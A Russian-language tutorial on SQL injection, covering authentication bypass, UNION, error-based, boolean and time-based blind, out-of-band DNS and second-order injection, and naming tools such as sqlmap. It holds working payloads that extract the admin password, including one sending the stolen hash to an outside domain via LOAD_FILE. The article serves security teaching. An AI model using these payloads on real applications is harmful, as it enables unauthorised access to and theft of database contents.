## Что такое SQL Injection

**SQL Injection **- уязвимость, позволяющая пользователю влиять на запросы, которые приложение делает к своей базе данных. В результате специалист по анализу защищенности может получить доступ к различным конфиденциальным данным в БД: пароли, заметки и пр. Помимо чтения, данные могут быть изменены или удалены. Также в некоторых случаях специалист может заставить сервер исполнять различные команды.

## Как устроена уязвимость

Большинство современных веб-приложений используют реляционные базы данных.

> **Реляционная база данных** - Это совокупность данных с заранее установленными связями между ними, организованная в виде таблиц, состоящих из строк и столбцов. Каждый столбец содержит данные определённого типа.

К популярным реляционным базам данных относят:

- **Oracle**
- **MySQL**
- **Microsoft SQL Server**
- **PostgreSQL**

Основным инструментом для взаимодействия с реляционными базами данных является язык **SQL** (Structured Query Language). Это стандартизированный язык запросов, который используется для создания, изменения и выборки данных. С его помощью можно выполнять операции добавления, обновления, удаления и поиска информации.

Уязвимость SQL-инъекции возникает, когда пользовательские данные подставляются в SQL-запрос без предварительной обработки или экранирования. В такой ситуации специалист по анализу защищенности получает возможность изменять синтаксическую структуру запроса, используя специальные символы языка SQL, и тем самым манипулировать логикой его выполнения.

Рассмотрим классический пример уязвимого веб-приложения в процессе аутентификации пользователя. При проверке учетных данных сервер формирует следующий SQL-запрос: **query = "SELECT \* FROM users WHERE username = '{0}' AND password = '{1}'".format(username, password)**. В данном случае значения переменных **username** и **password** напрямую конкатенируются в текст запроса без какой-либо валидации или параметризации.

Если специалист по анализу защищённости передаст в поле пароля специально сформированную полезную нагрузку **1' OR '1'='1**, итоговый запрос примет следующий вид: `SELECT * FROM users WHERE username = 'admin' AND password = '1' OR '1'='1'`

## Основные типы SQL Injection

### Union-based SQLi

**Union-based SQLi** относится к классу атак, при которых специалист по анализу защищенности использует оператор **UNION** для объединения результатов исходного SQL-запроса с собственным запросом с полезной нагрузкой. Если веб-приложение выводит результат выполнения запроса на страницу, специалист может подставить свой **SELECT** и получить данные из произвольных таблиц базы данных, отображаемые непосредственно в ответе сервера.

Ключевыми условиями успешной эксплуатации являются два ограничения, накладываемые спецификацией SQL:

- Количество столбцов в объединяемых запросах должно совпадать.
- Типы данных в соответствующих позициях должны быть совместимы.

Рассмотрим пример уязвимого веб-приложения, которое отображает информацию о товаре по его идентификатору: **query = "SELECT name, price FROM products WHERE id = '{0}'".format(product_id)**. При нормальном значении **product_id = 1** сервер формирует запрос **SELECT name, price FROM products WHERE id = '1'**. Если специалист по анализу защищенности передаст в параметр полезную нагрузку `1' UNION SELECT username, password FROM users-- `, итоговый запрос примет следующий вид: **SELECT name, price FROM products WHERE id = '1' UNION SELECT username, password FROM users-- '**. В результате специалист по анализу защищенности вместе с данными из таблицы **products** получит данные из таблицы **users**

> Последовательность **-- **обозначает начало **SQL-комментария**, вследствие чего оставшаяся часть запроса будет проигнорирована.

### Error-based SQLi

Это метод эксплуатации, при котором специалист по анализу защищенности извлекает данные из базы данных через сообщения об ошибках СУБД, возвращаемые приложением. Данный подход применяется в ситуациях, когда приложение не выводит результаты запроса напрямую на страницу, но при этом отображает детализированные сообщения об ошибках парсинга SQL. В некоторых случаях может встретиться база данных с включенным режимом подробного вывода ошибок. В этом режиме при возникновении ошибки СУБД возвращает детализированное сообщение, включающее полный текст SQL-запроса, позицию возникновения ошибки и другую диагностическую информацию.

**Verbose mode** позволяет преобразовать скрытую SQL-инъекцию в видимую, заставив приложение вернуть в сообщении об ошибке данные, полученные из базы данных. Для этого может использоваться функция **CAST()**, предназначенная для преобразования одного типа данных в другой: `CAST((SELECT password FROM users WHERE username = 'admin') AS int)`

Если данные, возвращаемые подзапросом, представляют собой строку, попытка преобразовать их в несовместимый тип (например, **int**) вызовет ошибку конвертации, в тексте которой будет отображено извлеченное значение: **ERROR: invalid input syntax for type integer: "187795e8226e882b86c1d815"**

В результате, последовательно подставляя различные подзапросы в функцию **CAST()**, специалист может извлекать произвольные данные из базы данных через сообщения об ошибках, даже если приложение не выводит результаты запроса напрямую на страницу.

### Boolean-based SQLi

**Boolean-based SQLi** относится к классу Blind-инъекций, при которых результат выполнения запроса не выводится на страницу напрямую. Специалист по анализу защищенности определяет истинность внедренных условий косвенно - через различие в поведении приложения при истинных и ложных результатах SQL-выражений.

Суть метода заключается в том, что пользователь формирует запросы с логическими условиями, каждое из которых проверяет один символ извлекаемых данных. Анализируя ответ приложения (изменение содержимого страницы, кода состояния HTTP, длины ответа или иных признаков), можно определить, было ли условие истинным или ложным.
Рассмотрим пример полезной нагрузки: `user_id = 1' AND SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a'--`

Данная полезная нагрузка содержит функцию **SUBSTRING**, которая принимает строку, позицию, с которой будет начинаться строка, и длину полученной подстроки. В данном случае строка передается из вложенного запроса, который возвращает пароль пользователя **admin**. Берется первый символ пароля, сравнивается с символом **a**, и далее, если условие истинно приложение формирует ответ, аналогичный штатному сценарию обработки запроса. Если условие ложно, запрос не возвращает ожидаемых данных, и поведение приложения изменяется.

Перебирая все возможные символы для каждой позиции, специалист может посимвольно восстановить значение любого поля базы данных.

### Time-based SQLi

**Time-based SQLi** - разновидность Blind-инъекций, применяемая в ситуациях, когда приложение вообще не реагирует на внедренные условия никакими визуальными изменениями: страница остается идентичной независимо от того, истинно условие или ложно. В таких случаях единственным каналом обратной связи становится время отклика сервера.

Суть метода заключается в использовании специфичных для каждой СУБД функций задержки выполнения запроса. Пользователь формирует условие, при котором сервер приостанавливает обработку запроса на заданное количество секунд только в случае истинности проверяемого выражения. Измеряя время ответа, специалист определяет результат условия: если ответ пришел с задержкой - условие истинно, если без задержки - ложно.

Рассмотрим пример полезной нагрузки: `1' AND IF(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a', SLEEP(5), 0)--`

Данная конструкция использует функцию **IF(условие, значение_если_истина, значение_если_ложь)**, которая проверяет условие и в зависимости от результата выполняет одну из двух веток. Вложенный запрос `(SELECT password FROM users WHERE username='admin')` возвращает пароль пользователя **admin**, функция **SUBSTRING(..., 1, 1)** извлекает его первый символ, после чего происходит сравнение с символом **'a'**.

Если условие истинно (первый символ пароля действительно равен **'a'**), выполняется функция **SLEEP(5)**, которая принудительно задерживает выполнение запроса на 5 секунд. В этом случае ответ от сервера придет с задержкой. Если условие ложно, функция **SLEEP** не вызывается, и приложение возвращает ответ в обычном режиме.

### Out-of-Band (OOB) SQLi

**Out-of-Band (OOB) SQLi** - это еще одна разновидность Blind-инъекций, применяемая в ситуациях, когда приложение не возвращает ни визуальных различий в ответе, ни задержек выполнения. В таких условиях могут использоваться альтернативные канала связи, отличные от основного HTTP-ответа. Наиболее распространенным выбором является DNS-протокол, поскольку исходящие DNS-запросы практически всегда разрешены межсетевыми экранами, поскольку необходимы для нормального функционирования любой сетевой инфраструктуры.

Суть метода заключается в том, что пользователь заставляет СУБД инициировать внешнее сетевое обращение к ресурсу, находящемуся под его контролем. Извлекаемые данные при этом кодируются непосредственно в имени запрашиваемого домена, что позволяет передать их за пределы защищаемой сети. Можно заставить веб-приложение обратиться к файлу на подконтрольном сервере: `LOAD_FILE('\\\\analyst.domain\\data')`

Данная конструкция использует функцию **LOAD_FILE**, предназначенную для чтения файлов с файловой системы сервера базы данных. В случае успешного выполнения СУБД попытается обратиться к указанному сетевому пути, что приведёт к DNS-запросу домена **analyst.domain**. Специалист по анализу защищённости, контролирующий этот домен, зафиксирует входящий запрос и тем самым подтвердит наличие уязвимости.

Для передачи данных из базы используется конкатенация результата подзапроса с именем домена: `LOAD_FILE(CONCAT('\\\\', (SELECT password FROM users WHERE username='admin'), '.analyst.domain\\a'))`. В этом случае DNS-запрос будет выглядеть как **187795e8226e882b86c1d815.analyst.domain**, и значение из базы (в примере хэш пароля администратора) окажется в логах DNS-сервера, которым управляет специалист.

### SQLi второго порядка

**SQLi второго порядка **- это разновидность уязвимости, при которой пользовательский ввод не выполняется немедленно, а сохраняется в базе данных и интерпретируется как часть SQL-запроса лишь при последующей обработке в другом месте приложения. В отличие от классической SQL-инъекции, где процесс происходит в том же запросе, в который внедряются данные, здесь между моментом внедрения и моментом эксплуатации проходит время, а сам вектор эксплуатации может находиться в совершенно ином компоненте системы.

Типичным сценарием возникновения такой уязвимости является процесс регистрации пользователя на сайте. Предположим, что при создании учетной записи приложение формирует параметризованный запрос, который корректно экранирует специальные символы: `INSERT INTO users (username, password) VALUES ('admin''--', 'password123')`. В этом случае инъекция не срабатывает и строка **admin'--** безопасно сохраняется в базе данных как обычное имя пользователя. Приложение может даже отобразить сообщение об успешной регистрации, не подозревая об опасности.

Однако позже, когда пользователь попытается изменить свой пароль или выполнить иное действие, требующее обращения к сохраненным данным, приложение может сформировать запрос, небезопасно конкатенируя имя пользователя из базы данных: `UPDATE users SET password = 'newpassword' WHERE username = 'admin'--'`

## Инструменты, используемые атакующими для обнаружения и последующей эксплуатации SQL Injection

- [**sqlmap**](https://github.com/sqlmapproject/sqlmap)** **- один из самых популярных инструментов для автоматического обнаружения и эксплуатации SQL Injection. Позволяет получать базу данных, извлекать таблицы, данные, выполнять команды ОС через SQLi
- [**Burp Suite**](https://portswigger.net/burp)** **- один из наиболее распространённых инструментов для тестирования безопасности веб-приложений. Используется для перехвата, изменения и анализа HTTP-запросов, а также автоматизированного поиска различных уязвимостей, включая OS Command Injection.
- [**NucleiFuzzer**](https://github.com/0xKayala/NucleiFuzzer) - это продвинутый инструмент автоматизации, созданный для упрощения и ускорения тестирования безопасности веб-приложений. Он объединяет несколько мощных решений для поиска и анализа URL-адресов и уязвимостей, включая ParamSpider, Waybackurls, Katana, Gauplus и Hakrawler, обеспечивая комплексный сбор и перечисление возможных точек входа в веб-приложение.
